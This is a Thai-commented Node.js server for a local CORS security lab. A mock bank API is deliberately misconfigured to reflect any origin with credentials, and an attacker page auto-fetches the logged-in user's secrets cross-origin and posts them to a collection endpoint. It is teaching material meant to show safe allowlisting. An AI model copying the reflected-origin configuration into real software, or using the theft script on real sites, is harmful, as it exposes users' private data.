// =====================================================================
//  CORS Lab — เว็บที่ "ตั้งใจ" ให้ตั้งค่า CORS ผิด เพื่อการเรียนรู้การป้องกัน
//  ⚠ ห้ามเอาไปรันบนเซิร์ฟเวอร์จริง / ห้ามเปิดให้คนอื่นเข้าถึง
//  รันแค่บนเครื่องตัวเอง (127.0.0.1) เท่านั้น
//
//  ไม่ต้องติดตั้งอะไรเพิ่ม ใช้แค่ Node.js:  node server.js
// =====================================================================

const http = require('http');
const crypto = require('crypto');

const HOST = '127.0.0.1';                       // ฟังเฉพาะ loopback ของเครื่องตัวเอง
const PORT = Number(process.env.PORT) || 4400;

// ---------------------------------------------------------------------
//  หัวใจของแล็บ: ใช้ "สอง origin บนเครื่องเดียว" ให้เป็น cross-origin จริง
//
//  เบราว์เซอร์ถือว่า http://localhost:4400 กับ http://127.0.0.1:4400
//  เป็น "คนละ origin" กัน เพราะ origin = scheme + host + port และ
//  host "localhost" ไม่เท่ากับ host "127.0.0.1" (เทียบกันแบบตัวอักษร
//  ไม่ได้ resolve DNS ก่อน) ทั้งที่ชี้ไปเครื่องเดียวกัน
//
//  - ธนาคาร/เหยื่อ เปิดที่  http://localhost:4400      (อยู่ใน allowlist)
//  - เว็บแฮกเกอร์ เปิดที่    http://127.0.0.1:4400/evil  (ไม่อยู่ใน allowlist)
//  - หน้า /evil จะ fetch ข้าม origin ไปที่ http://localhost:4400/api/...
// ---------------------------------------------------------------------
const BANK_ORIGIN = `http://localhost:${PORT}`;   // origin ของธนาคาร (เหยื่อ)
const EVIL_ORIGIN = `http://127.0.0.1:${PORT}`;    // origin ของเว็บแฮกเกอร์

// ✅ allowlist ของฝั่ง SAFE: อนุญาตให้อ่าน response ได้เฉพาะ origin นี้
const ALLOWLIST = new Set([BANK_ORIGIN]);

// ---------------------------------------------------------------------
// ข้อมูลในหน่วยความจำ (ปิดเซิร์ฟเวอร์ หรือเข้า /reset แล้วรีเซ็ตใหม่)
// ---------------------------------------------------------------------
function seed() {
  return {
    users: {
      somsri: {
        password: 'somsri123',
        name: 'คุณสมศรี ใจดี',
        email: 'somsri@siamsecure.example',
        balance: 152340,
        secretNote: 'เลขบัญชี 111-2-33333-4 · OTP ล่าสุด 882190',
      },
    },
    // เซสชันจำลองของ "เหยื่อที่ล็อกอินค้างไว้" (ดูหมายเหตุเรื่อง credentials ด้านล่าง)
    session: null,              // { user } หรือ null
    stolen: [],                 // รายการข้อมูลที่เว็บแฮกเกอร์อ่าน (ขโมย) ไปได้
  };
}
let db = seed();

function newId() { return crypto.randomBytes(8).toString('hex'); }

function parseCookies(req) {
  const out = {};
  (req.headers.cookie || '').split(';').forEach((kv) => {
    const i = kv.indexOf('=');
    if (i > -1) out[kv.slice(0, i).trim()] = decodeURIComponent(kv.slice(i + 1).trim());
  });
  return out;
}

// ผู้ใช้ที่ "ล็อกอินค้างไว้" ตอนนี้ (เซสชันจำลองในหน่วยความจำ)
function activeUser() {
  return db.session ? db.users[db.session.user] : null;
}

function escapeHtml(v) {
  return String(v).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[ch]));
}

// =====================================================================
//  ⭐ จุดสำคัญที่สุดของแล็บ: การตั้งค่า CORS header 3 โหมด
//  CORS คุมว่า "เว็บต้นทาง (origin) ไหน อ่าน response ของ API เราผ่าน
//  เบราว์เซอร์ได้บ้าง" — ไม่ได้คุมว่าใครยิง API ได้ (นั่นคือเรื่อง auth)
// =====================================================================
function applyCors(req, res, mode) {
  const origin = req.headers.origin; // เบราว์เซอร์ใส่มาเองในคำขอข้าม origin

  if (mode === 'vuln') {
    // ❌ ตั้งผิดแบบคลาสสิก: "สะท้อน" Origin ที่ร้องขอกลับมาแบบไม่กรองเลย
    //    + อนุญาต credentials → เว็บไหนก็อ่านข้อมูลลับของเหยื่อได้หมด
    if (origin) res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');

  } else if (mode === 'safe') {
    // ✅ ตั้งถูก: ส่ง ACAO เฉพาะเมื่อ origin อยู่ใน allowlist เท่านั้น
    //    origin อื่น ๆ จะไม่มี header นี้ → เบราว์เซอร์บล็อกการอ่าน response
    if (origin && ALLOWLIST.has(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    res.setHeader('Vary', 'Origin'); // บอก cache ว่า response เปลี่ยนตาม Origin

  } else if (mode === 'wildcard') {
    // ❌ ตั้งผิดอีกแบบ: ACAO: * (อนุญาตทุก origin)
    //    - คำขอแบบ "ไม่ส่ง credential": ทุก origin อ่านได้ → ข้อมูลลับรั่วถ้าใช้กับ secret
    //    - คำขอแบบ "ส่ง credential": เบราว์เซอร์จะบล็อก เพราะ * ใช้คู่ credentials ไม่ได้
    res.setHeader('Access-Control-Allow-Origin', '*');
  }

  // header สำหรับ preflight: อนุญาต method/header ที่ใช้ในแล็บ
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-Demo, Content-Type');
}

// ตอบ API /api/... (ทั้ง preflight OPTIONS และ GET จริง)
function handleApi(req, res, mode) {
  applyCors(req, res, mode);

  // ----- preflight -----
  // เบราว์เซอร์ยิง OPTIONS มาก่อน เมื่อคำขอ "ไม่ใช่ simple request"
  // (ในแล็บเราแนบ header X-Demo ในทุก fetch จึงเกิด preflight ให้เห็นชัด)
  if (req.method === 'OPTIONS') {
    console.log(`\x1b[36m[preflight] OPTIONS ${req.url}  origin=${req.headers.origin || '-'}  (mode=${mode})\x1b[0m`);
    res.writeHead(204);
    return res.end();
  }

  // ----- คำขอจริง -----
  // ⚠ สังเกต: เซิร์ฟเวอร์ "ส่งข้อมูลออกไปเสมอ" ไม่ว่ามาจาก origin ไหน
  //    ตัวที่บล็อกคือ "เบราว์เซอร์" ตาม CORS header ที่ตอบกลับ
  //    (curl/Postman จึงเห็นข้อมูลเสมอ — นั่นคือเหตุผลว่า CORS ≠ การตรวจสิทธิ์)
  const u = activeUser();
  const body = u
    ? {
        loggedIn: true,
        name: u.name,
        email: u.email,
        balance: u.balance,
        secretNote: u.secretNote,
        servedBy: mode,
      }
    : { loggedIn: false, message: 'ยังไม่มีเหยื่อล็อกอินค้างไว้ — ไปล็อกอินที่ธนาคารก่อน (http://localhost:' + PORT + '/)' };

  res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify(body));
}

// =====================================================================
// CSS ฝังในโค้ด (ไม่ต้องมีไฟล์แยก)
// =====================================================================
const STYLE = `
:root{--bg:#eef1f5;--card:#fff;--text:#1d232b;--muted:#5d6673;--line:#dde1e6;--accent:#15803d;--red:#c62828;--red-bg:#fdecec;--green:#1e7d3a;--green-bg:#e7f5eb}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:"Sarabun","Leelawadee UI","Tahoma",system-ui,sans-serif;line-height:1.6}
body.evil{--accent:#6d28d9;background:#1a1626;color:#eee}
header{display:flex;align-items:center;gap:12px;padding:12px 20px;background:var(--card);border-bottom:1px solid var(--line);flex-wrap:wrap}
body.evil header{background:#120f1c;border-color:#2a2440}
.logo{font-weight:700;font-size:18px;color:var(--text);text-decoration:none}
body.evil .logo{color:#c4b5fd}
main{max-width:820px;margin:0 auto;padding:24px 16px 48px}
footer{text-align:center;color:var(--muted);font-size:13px;padding:16px}
a{color:var(--accent)}
h1{margin-top:0}
.badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:12px;font-weight:700}
.badge.vuln{background:var(--red-bg);color:var(--red)}
.badge.safe{background:var(--green-bg);color:var(--green)}
form{display:flex;flex-direction:column;gap:8px;margin:16px 0;max-width:360px}
input{font:inherit;padding:8px 12px;border:1px solid var(--line);border-radius:8px}
button{font:inherit;padding:10px 16px;border:none;border-radius:8px;background:var(--accent);color:#fff;cursor:pointer;font-weight:600}
button.secondary{background:#64748b}
button.evil{background:#dc2626}
.card,.result{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 20px;margin:14px 0}
body.evil .card,body.evil .result{background:#231d33;border-color:#3a3151}
.balance{font-size:34px;font-weight:800;color:var(--accent)}
table{width:100%;border-collapse:collapse;background:var(--card)}
body.evil table{background:#231d33}
th,td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
body.evil th,body.evil td{border-color:#3a3151}
th{background:#f1f4f8}
body.evil th{background:#1a1626}
code{font-family:Consolas,monospace;background:#e7ebf1;padding:1px 6px;border-radius:4px}
body.evil code{background:#140f20;color:#d6bcfa}
pre{background:#0d1117;color:#c9d1d9;padding:14px;border-radius:10px;overflow:auto;font-size:13px;white-space:pre-wrap;word-break:break-word}
.muted{color:var(--muted)}
.switch{margin-top:24px;color:var(--muted)}
.ok{color:var(--green);font-weight:700}
.bad{color:var(--red);font-weight:700}
.btnrow{display:flex;flex-direction:column;gap:10px;max-width:520px}
`;

// ---------------------------------------------------------------------
// โครงหน้าเว็บ
// ---------------------------------------------------------------------
function page(title, body, { evil = false, badge = '' } = {}) {
  const b =
    badge === 'vuln' ? '<span class="badge vuln">⚠ VULNERABLE</span>' :
    badge === 'safe' ? '<span class="badge safe">✔ SAFE</span>' : '';
  return `<!doctype html>
<html lang="th"><head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${title}</title><link rel="stylesheet" href="/static/style.css">
</head><body class="${evil ? 'evil' : 'bank'}">
  <header>
    <a href="/" class="logo">${evil ? '😈 FreeMoviesHD (เว็บของแฮกเกอร์)' : '🏦 SiamSecure Bank'}</a>${b}
  </header>
  <main>${body}</main>
  <footer>⚠ แล็บนี้ตั้งใจให้มีช่องโหว่ ใช้บนเครื่องตัวเองเพื่อการศึกษาเท่านั้น · ห้าม deploy · ห้ามใช้กับระบบที่ไม่ได้รับอนุญาต (ผิด พ.ร.บ. คอมพิวเตอร์ฯ) · Anti-hacking matters</footer>
</body></html>`;
}

function send(res, status, html, { cookie } = {}) {
  const headers = { 'Content-Type': 'text/html; charset=utf-8' };
  if (cookie) headers['Set-Cookie'] = cookie;
  res.writeHead(status, headers);
  res.end(html);
}
function redirect(res, location, cookie) {
  const headers = { Location: location };
  if (cookie) headers['Set-Cookie'] = cookie;
  res.writeHead(303, headers);
  res.end();
}
function readForm(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (c) => { data += c; if (data.length > 50_000) { req.destroy(); reject(new Error('big')); } });
    req.on('end', () => resolve(new URLSearchParams(data)));
    req.on('error', reject);
  });
}

// =====================================================================
// หน้าธนาคาร (ฝั่งเหยื่อ) — ควรเปิดที่ http://localhost:4400
// =====================================================================
function loginPage(msg) {
  return page('เข้าสู่ระบบ · SiamSecure Bank', `
    <h1>เข้าสู่ระบบธนาคาร</h1>
    <p>นี่คือ API ที่มีข้อมูลลับของผู้ใช้ (ชื่อ อีเมล ยอดเงิน) ล็อกอินเพื่อจำลองว่า
       "เหยื่อเปิดเว็บธนาคารค้างไว้"</p>
    ${msg ? `<p class="result bad">${escapeHtml(msg)}</p>` : ''}
    <form method="post" action="/login">
      <input name="username" placeholder="ชื่อผู้ใช้" required>
      <input name="password" type="password" placeholder="รหัสผ่าน" required>
      <button>เข้าสู่ระบบ</button>
    </form>
    <div class="result"><b>บัญชีทดสอบ:</b> <code>somsri</code> / <code>somsri123</code></div>
    <p class="switch">แนะนำให้เปิดหน้านี้ที่ <code>${BANK_ORIGIN}</code> (origin ที่อยู่ใน allowlist ของฝั่ง SAFE)</p>
  `);
}

function dashboard(req) {
  const u = activeUser();
  return page('หน้าหลัก · SiamSecure Bank', `
    <h1>สวัสดี ${escapeHtml(u.name)}</h1>
    <div class="card">ยอดเงินคงเหลือ<div class="balance">${u.balance.toLocaleString()} บาท</div>
      <p class="muted">🔒 ข้อมูลลับ: ${escapeHtml(u.email)} · ${escapeHtml(u.secretNote)}</p>
    </div>

    <div class="card">
      <h2>ทดสอบ: หน้านี้อ่าน API ของตัวเองได้ไหม</h2>
      <p>หน้าธนาคารนี้อยู่ที่ origin <code id="self"></code> จะลองเรียก
         <code>/api/safe/me</code> (ฝั่ง SAFE) ดูว่า origin ของตัวเองอ่านได้หรือไม่</p>
      <pre id="selftest">กำลังทดสอบ...</pre>
    </div>

    <p class="switch">
      ขั้นต่อไป: เปิด "เว็บของแฮกเกอร์" ที่คนละ origin →
      <a href="${EVIL_ORIGIN}/evil">${EVIL_ORIGIN}/evil</a>
      · <a href="/logout">ออกจากระบบ</a> · <a href="/reset">รีเซ็ตแล็บ</a>
    </p>

    <script>
      document.getElementById('self').textContent = location.origin;
      // หน้าธนาคาร (origin ที่อยู่ใน allowlist) ควรอ่าน /api/safe/me ได้ตามปกติ
      fetch('/api/safe/me', { credentials: 'include', headers: { 'X-Demo': '1' } })
        .then(r => r.json())
        .then(d => {
          document.getElementById('selftest').textContent =
            '✅ อ่านได้ (เพราะ origin นี้อยู่ใน allowlist)\\n\\n' + JSON.stringify(d, null, 2);
        })
        .catch(e => {
          document.getElementById('selftest').textContent =
            '❌ อ่านไม่ได้: ' + e + '\\n\\n(ถ้าเห็นข้อความนี้ แปลว่าคุณเปิดหน้าธนาคารผิด origin — ให้เปิดที่ ' + ${JSON.stringify(BANK_ORIGIN)} + ')';
        });
    </script>
  `, { badge: 'safe' });
}

// =====================================================================
// หน้าเว็บของแฮกเกอร์ — ต้องเปิดที่ http://127.0.0.1:4400/evil
// (คนละ origin กับธนาคารที่ localhost จึงเป็น cross-origin จริง)
// =====================================================================
function evilPage() {
  const stolenRows = db.stolen.map((s) =>
    `<tr><td>${escapeHtml(s.time)}</td><td><code>${escapeHtml(s.origin)}</code></td><td><code>${escapeHtml(s.data)}</code></td></tr>`
  ).join('') || '<tr><td colspan="3" class="muted">ยังไม่มีข้อมูลที่อ่านได้</td></tr>';

  return page('ดูหนังฟรี HD!', `
    <h1>🎬 ดูหนังใหม่ชนโรง ฟรี! ไม่ต้องสมัคร</h1>
    <p class="muted">(เบื้องหลัง: หน้านี้กำลังพยายามอ่านข้อมูลลับจาก API ของธนาคารที่คนละ origin
       โดยอาศัยเซสชันของคุณที่ล็อกอินค้างไว้)</p>

    <div class="card">
      <b>origin ของหน้านี้:</b> <code id="self"></code><br>
      <b>API เป้าหมาย:</b> <code>${BANK_ORIGIN}/api/...</code>
      <p id="warn" class="bad" style="display:none">
        ⚠ คุณเปิดหน้านี้ที่ origin เดียวกับ API — จะไม่ใช่ cross-origin!
        ให้เปิดที่ <a href="${EVIL_ORIGIN}/evil">${EVIL_ORIGIN}/evil</a>
      </p>
    </div>

    <div class="btnrow">
      <button class="evil" onclick="attack('/api/me','vuln')">① โจมตีหน้า VULN: อ่าน /api/me (สะท้อน origin + credentials)</button>
      <button class="secondary" onclick="attack('/api/safe/me','safe')">② ลองหน้า SAFE: อ่าน /api/safe/me (allowlist)</button>
      <button class="secondary" onclick="attack('/api/wildcard/me','wild-nocred')">③ อ่าน /api/wildcard/me แบบ "ไม่ส่ง credential" (ACAO: *)</button>
      <button class="secondary" onclick="attack('/api/wildcard/me','wild-cred')">④ อ่าน /api/wildcard/me แบบ "ส่ง credential" (* + cred)</button>
    </div>

    <div class="result">
      <b>ผลล่าสุด:</b>
      <pre id="out">กำลังโจมตีอัตโนมัติ (①)...</pre>
    </div>

    <h2>🕵️ ข้อมูลที่เว็บนี้อ่าน (ขโมย) ไปได้แล้ว</h2>
    <table><tr><th>เวลา</th><th>จาก origin</th><th>ข้อมูล</th></tr>${stolenRows}</table>
    <form method="post" action="/evil/clear" style="margin-top:12px"><button class="secondary">ล้างรายการ</button></form>

    <p class="switch">กลับไปดูหน้าธนาคารที่ <a href="${BANK_ORIGIN}/">${BANK_ORIGIN}</a></p>

    <script>
      const API = ${JSON.stringify(BANK_ORIGIN)};
      document.getElementById('self').textContent = location.origin;
      if (location.origin === API) document.getElementById('warn').style.display = 'block';

      function render(txt) { document.getElementById('out').textContent = txt; }

      async function attack(path, mode) {
        const url = API + path;
        // แนบ header X-Demo เพื่อให้เกิด preflight (OPTIONS) ให้เห็นชัดใน Network tab
        const opts = { headers: { 'X-Demo': '1' } };
        // โหมดที่ต้องการ credential จะใส่ credentials:'include'
        if (mode === 'vuln' || mode === 'safe' || mode === 'wild-cred') opts.credentials = 'include';

        render('⏳ fetch(' + url + ')  [' + mode + '] ...');
        try {
          const r = await fetch(url, opts);
          const data = await r.json();
          const pretty = JSON.stringify(data, null, 2);

          if (mode === 'safe') {
            render('😮 อ่านได้?! (ไม่ควรเกิดขึ้นถ้าตั้ง allowlist ถูก)\\n\\n' + pretty);
          } else {
            render('✅ อ่านข้อมูลลับได้สำเร็จ!\\n\\n' + pretty);
            if (data.loggedIn) {
              // ส่งข้อมูลที่อ่านได้กลับไปเก็บที่เซิร์ฟเวอร์ของแฮกเกอร์ (same-origin)
              const stolen = data.name + ' · ' + data.email + ' · ' + data.balance + ' บาท · ' + data.secretNote;
              fetch('/evil/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ data: stolen }),
              });
            }
          }
        } catch (e) {
          // ถ้าถูก CORS บล็อก fetch จะ reject เป็น TypeError และ Console จะมี error สีแดง
          render('❌ อ่านไม่ได้ — ถูกเบราว์เซอร์บล็อกด้วย CORS policy\\n\\n'
            + e + '\\n\\n👉 เปิด DevTools (F12) → Console จะเห็นข้อความ\\n'
            + '   "Access to fetch at ... has been blocked by CORS policy"\\n'
            + (mode === 'wild-cred'
                ? '   (เพราะ Access-Control-Allow-Origin: * ใช้คู่กับ credentials ไม่ได้)'
                : mode === 'safe'
                  ? '   (เพราะ origin นี้ไม่อยู่ใน allowlist เซิร์ฟเวอร์จึงไม่ส่ง ACAO ให้)'
                  : ''));
        }
      }

      // โจมตีหน้า VULN อัตโนมัติเมื่อหน้าโหลด (ให้เห็นผลทันที)
      if (location.origin !== API) attack('/api/me', 'vuln');
      else render('เปิดหน้านี้ที่ ' + ${JSON.stringify(EVIL_ORIGIN)} + '/evil ก่อน แล้วค่อยกดปุ่มโจมตี');
    </script>
  `, { evil: true, badge: 'vuln' });
}

// =====================================================================
// Router
// =====================================================================
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || HOST}`);
  const p = url.pathname;

  try {
    // ----- static -----
    if (req.method === 'GET' && p === '/static/style.css') {
      res.writeHead(200, { 'Content-Type': 'text/css; charset=utf-8' });
      return res.end(STYLE);
    }

    // ----- API (รองรับทั้ง OPTIONS preflight และ GET) -----
    if (p === '/api/me')          return handleApi(req, res, 'vuln');
    if (p === '/api/safe/me')     return handleApi(req, res, 'safe');
    if (p === '/api/wildcard/me') return handleApi(req, res, 'wildcard');

    // ----- GET หน้าเว็บ -----
    if (req.method === 'GET') {
      if (p === '/login')  return send(res, 200, loginPage());
      if (p === '/logout') { db.session = null; return redirect(res, '/login', 'cors_demo=; Path=/; Max-Age=0'); }
      if (p === '/reset')  { db = seed(); return redirect(res, '/login'); }
      if (p === '/evil')   return send(res, 200, evilPage());
      if (p === '/') {
        if (!activeUser()) return redirect(res, '/login');
        return send(res, 200, dashboard(req));
      }
    }

    // ----- POST -----
    if (req.method === 'POST') {
      const form = await readForm(req);

      if (p === '/login') {
        const username = (form.get('username') || '').trim();
        const u = db.users[username];
        if (u && form.get('password') === u.password) {
          db.session = { user: username };                 // ตั้งเซสชันจำลองของเหยื่อ
          return redirect(res, '/', `cors_demo=${newId()}; Path=/; SameSite=Lax`);
        }
        return send(res, 200, loginPage('ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง'));
      }

      // เซิร์ฟเวอร์ของแฮกเกอร์: รับข้อมูลที่อ่าน (ขโมย) ได้มาเก็บไว้ + log สีแดง
      if (p === '/evil/collect') {
        const data = (form.get('data') || '').slice(0, 500);
        const origin = req.headers.origin || EVIL_ORIGIN;
        db.stolen.unshift({ time: new Date().toLocaleTimeString('th-TH'), origin, data });
        db.stolen.length = Math.min(db.stolen.length, 30);
        console.log(`\x1b[31m[CORS ATTACK] เว็บแฮกเกอร์ (${origin}) อ่านข้อมูลลับของเหยื่อได้สำเร็จ: ${data}\x1b[0m`);
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('ok');
      }
      if (p === '/evil/clear') { db.stolen.length = 0; return redirect(res, '/evil'); }
    }

    res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(page('404', '<h1>404</h1><p><a href="/">กลับหน้าหลัก</a></p>'));
  } catch (err) {
    console.error(err);
    if (!res.headersSent) { res.writeHead(500); res.end('error'); }
  }
});

server.listen(PORT, HOST, () => {
  console.log('');
  console.log('  \x1b[33m⚠  CORS Lab — เว็บนี้ตั้งใจตั้งค่า CORS ผิด ใช้เรียนรู้บนเครื่องตัวเองเท่านั้น\x1b[0m');
  console.log(`  ธนาคาร (เหยื่อ):   \x1b[36m${BANK_ORIGIN}\x1b[0m   ← ล็อกอิน somsri/somsri123 ที่นี่`);
  console.log(`  เว็บแฮกเกอร์:      \x1b[35m${EVIL_ORIGIN}/evil\x1b[0m   ← เปิดหลังล็อกอิน`);
  console.log('  เปิด DevTools (F12) → Console/Network เพื่อดูการบล็อกของ CORS');
  console.log('  กด Ctrl+C เพื่อปิด');
  console.log('');
});
